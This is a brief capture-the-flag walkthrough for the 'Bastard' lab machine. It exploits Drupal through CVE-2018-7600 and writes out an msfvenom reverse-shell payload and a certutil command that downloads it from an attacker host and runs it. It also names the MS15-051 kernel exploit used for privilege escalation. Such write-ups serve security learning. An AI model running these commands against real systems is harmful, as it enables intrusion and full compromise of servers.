Bastard without metasploit

![Bastard](https://user-images.githubusercontent.com/55708909/91456087-7c893680-e8a0-11ea-997f-faea59304e45.png)


Starting with nmap scan

Nmap -sC -sV -T4 -A -O -oA Bastard -p- 10.10.10.9

![Bastard_nmap](https://user-images.githubusercontent.com/55708909/91456386-d25dde80-e8a0-11ea-9e88-015afaf89bc3.png)

Port 80 give us drupal i thought of running the other tool but ran gobuster. It gave me CHANGELOG.txt which gave me version number and 
thus i drop the idea of running droopescan


![Bastard_change](https://user-images.githubusercontent.com/55708909/91457435-fa9a0d00-e8a1-11ea-839b-546a8a84c1bb.png)

For this particular version there is a python exploit drupa7-CVE-2018-7600.py

Upload the shell using this python exploit, 

Step1:  msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.10.14.6 LPORT=4444 -f exe >> shell.exe

Step2:  Upload the shell.exe using this commands

python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c  "certutil.exe -urlcache -split -f http://10.10.14.6/shell1.exe  c:\Windows\Temp\shell1.exe"

Step3 : Execute the reverse shell using these commands

python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c  "c:\Windows\Temp\shell1.exe"

We have a shell here.

![Bastard_shell](https://user-images.githubusercontent.com/55708909/91519022-1e476c80-e90f-11ea-8238-428cbe0611ae.png)


After that i run systeminfo commands and put in in txt form and run windows-exploit-suggester and ran MS15-051 Kernel exploits and got 

Highest priviledges. 




